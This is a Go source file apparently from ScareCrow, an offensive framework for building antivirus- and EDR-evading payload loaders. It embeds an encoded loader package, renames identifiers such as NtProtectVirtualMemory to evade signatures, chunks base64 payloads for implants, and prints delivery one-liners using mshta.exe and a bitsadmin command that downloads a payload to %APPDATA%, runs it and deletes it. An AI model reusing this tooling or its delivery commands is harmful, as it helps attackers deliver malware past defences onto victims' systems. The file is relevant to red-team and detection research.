package Utils

import (
	"ScareCrow/Cryptor"
	"archive/zip"
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"

	"github.com/fatih/color"
)

const base64string = "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"

func Version() {
	Version := runtime.Version()
	Version = strings.Replace(Version, "go1.", "", -1)
	VerNumb, _ := strconv.ParseFloat(Version, 64)
	if VerNumb >= 16.1 {
	} else {
		log.Fatal("Error: The version of Go is to old, please update to version 1.16.1 or later")
	}
}

func ModuleObfuscator(name string) {
	NTVirProt := Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
	Alloc := Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
	loader := Cryptor.VarNumberLength(10, 19)
	name = name + ".go"
	PackageEditor("loader/loader.go", "NtProtectVirtualMemory", NTVirProt)
	PackageEditor("loader/loader.go", "Allocate", Alloc)
	PackageEditor("loader/loader.go", "loader", loader)
	PackageEditor("loader/asm.s", "NtProtectVirtualMemory", NTVirProt)
	PackageEditor("loader/asm.s", "Allocate", Alloc)
	PackageEditor(name, "[loader]", loader)
	PackageEditor(name, "[NtProtectVirtualMemory]", NTVirProt)
	PackageEditor(name, "[Allocate]", Alloc)
	PackageEditor("go.mod", "loader", loader)
	os.Rename("loader/loader.go", "loader/"+loader+".go")
	os.Rename("loader", loader)
}

func PackageEditor(file, orginalstring, replacestring string) {
	input, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	output := bytes.Replace(input, []byte(orginalstring), []byte(replacestring), -1)

	if err = ioutil.WriteFile(file, output, 0666); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

func Writefile(outFile string, result string) {
	cf, err := os.OpenFile(outFile, os.O_CREATE|os.O_WRONLY, 0644)
	check(err)
	defer cf.Close()
	_, err = cf.Write([]byte(result))
	check(err)
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func StringEncode(b64 string, number int) string {
	var encoded string
	encoded = base64.StdEncoding.EncodeToString([]byte(b64))
	sum := 1
	for i := 1; i < number; i++ {
		encoded = base64.StdEncoding.EncodeToString([]byte(encoded))
		sum += i
	}
	return encoded
}

func B64ripper(B64string string, B64Varible string, implant bool) string {
	var B64payload []string
	MAX_LENGTH := Cryptor.GenerateNumer(400, 850)
	x := 0
	B64length := len(B64string)
	if implant == true {
		B64payload = append(B64payload, fmt.Sprintf("var "+B64Varible+" string\n"))
		for x < B64length {
			if x+MAX_LENGTH <= B64length {
				B64payload = append(B64payload, fmt.Sprintf("		"+B64Varible+" = "+B64Varible+" + \"%s\"\n", B64string[0+x:x+MAX_LENGTH]))

				x += MAX_LENGTH
			} else {
				finalLength := B64length - x
				B64payload = append(B64payload, fmt.Sprintf("		"+B64Varible+" = "+B64Varible+" + \"%s\"\n", B64string[0+x:x+finalLength]))
				x += finalLength
			}
		}
	} else {
		B64payload = append(B64payload, fmt.Sprintf("var "+B64Varible+"=\"\";\n"))
		for x < B64length {
			if x+MAX_LENGTH <= B64length {
				B64payload = append(B64payload, fmt.Sprintf("		"+B64Varible+" = "+B64Varible+" + \"%s\";\n", B64string[0+x:x+MAX_LENGTH]))

				x += MAX_LENGTH
			} else {
				finalLength := B64length - x
				B64payload = append(B64payload, fmt.Sprintf("		"+B64Varible+" = "+B64Varible+" + \"%s\";\n", B64string[0+x:x+finalLength]))
				x += finalLength
			}
		}

	}
	finalstring := strings.Join(B64payload, "")
	return finalstring
}

func Unzip(src string, dest string) ([]string, error) {
	var filenames []string
	r, err := zip.OpenReader(src)
	if err != nil {
		return filenames, err
	}
	defer r.Close()
	for _, f := range r.File {
		fpath := filepath.Join(dest, f.Name)
		if !strings.HasPrefix(fpath, filepath.Clean(dest)+string(os.PathSeparator)) {
			return filenames, fmt.Errorf("%s: illegal file path", fpath)
		}
		filenames = append(filenames, fpath)
		if f.FileInfo().IsDir() {
			os.MkdirAll(fpath, os.ModePerm)
			continue
		}
		if err = os.MkdirAll(filepath.Dir(fpath), os.ModePerm); err != nil {
			return filenames, err
		}
		outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
		if err != nil {
			return filenames, err
		}
		rc, err := f.Open()
		if err != nil {
			return filenames, err
		}
		_, err = io.Copy(outFile, rc)
		outFile.Close()
		rc.Close()

		if err != nil {
			return filenames, err
		}
	}
	return filenames, nil
}

func B64decode(name string) {
	dec, err := base64.StdEncoding.DecodeString(base64string)
	if err != nil {
		panic(err)
	}
	f, err := os.Create(name)
	if err != nil {
		panic(err)
	}
	defer f.Close()
	if _, err := f.Write(dec); err != nil {
		panic(err)
	}
	if err := f.Sync(); err != nil {
		panic(err)
	}
}

func Zipit(source, target string) error {
	zipfile, err := os.Create(target)
	if err != nil {
		return err
	}
	defer zipfile.Close()
	archive := zip.NewWriter(zipfile)
	defer archive.Close()
	info, err := os.Stat(source)
	if err != nil {
		return nil
	}
	var baseDir string
	if info.IsDir() {
		baseDir = filepath.Base(source)
	}
	filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}
		if baseDir != "" {
			header.Name = filepath.Join(baseDir, strings.TrimPrefix(path, source))
		}
		if info.IsDir() {
			header.Name += "/"
		} else {
			header.Method = zip.Deflate
		}
		writer, err := archive.CreateHeader(header)
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()
		_, err = io.Copy(writer, file)
		return err

	})
	return err
}

func Command(URL string, CommandLoader string, outFile string) string {

	if URL != "" && CommandLoader == "hta" {
		fmt.Println("[*] HTA Payload")
		fmt.Println("[!] Can be executed manually by a user or embeded into a one liner command that executes it:")
		if strings.HasSuffix(URL, "/") {
			fmt.Println("mshta.exe " + URL + outFile)
		} else {
			fmt.Println("mshta.exe " + URL + "/" + outFile)
		}
	}
	if URL == "" && !strings.Contains(outFile, ".js") && !strings.Contains(outFile, ".hta") {
		fmt.Println(color.GreenString("[+] ") + "Non Executable file extension detected. Either add the extension \".js\" or use the following to execute it (note that this works from a local instance, webdav or fileshare... not a  webserver):")
		fmt.Println("cscript //E:jscript " + outFile + "")
	}
	if URL != "" && CommandLoader == "macro" {
		if strings.HasSuffix(URL, "/") {
		} else {
			URL = URL + "/"
		}
		fmt.Println("[*] Macro Delivery Payload")
		fmt.Println("[!] Excel macro that will download, execute and remove the payload:")
	}

	if URL != "" && CommandLoader == "bits" {
		fmt.Println("[*] Bitsadmin")
		fmt.Println("[!] One liner command to execute it:")
		if !strings.Contains(outFile, ".js") && !strings.Contains(outFile, ".hta") && !strings.Contains(outFile, ".cpl") && !strings.Contains(outFile, ".exe") {
			if strings.HasSuffix(URL, "/") {
				fmt.Println("bitsadmin /transfer " + outFile + " " + URL + outFile + " %APPDATA%\\" + outFile + " & cscript //E: JScript %APPDATA%\\" + outFile + " & timeout 20 & del %APPDATA%\\" + outFile + "")
			} else {
				fmt.Println("bitsadmin /transfer " + outFile + " " + URL + "/" + outFile + " %APPDATA%\\" + outFile + " & cscript //E: JScript %APPDATA%\\" + outFile + " & timeout 20 & del %APPDATA%\\" + outFile + "")
			}
		} else {
			if strings.HasSuffix(URL, "/") {
				fmt.Println("bitsadmin /transfer " + outFile + " " + URL + outFile + " %APPDATA%\\" + outFile + " & %APPDATA%\\" + outFile + " & timeout 20 & del %APPDATA%\\" + outFile + "")
			} else {
				fmt.Println("bitsadmin /transfer " + outFile + " " + URL + "/" + outFile + " %APPDATA%\\" + outFile + " & %APPDATA%\\" + outFile + " & timeout 20 & del %APPDATA%\\" + outFile + "")

			}
		}
	}
	return URL
}
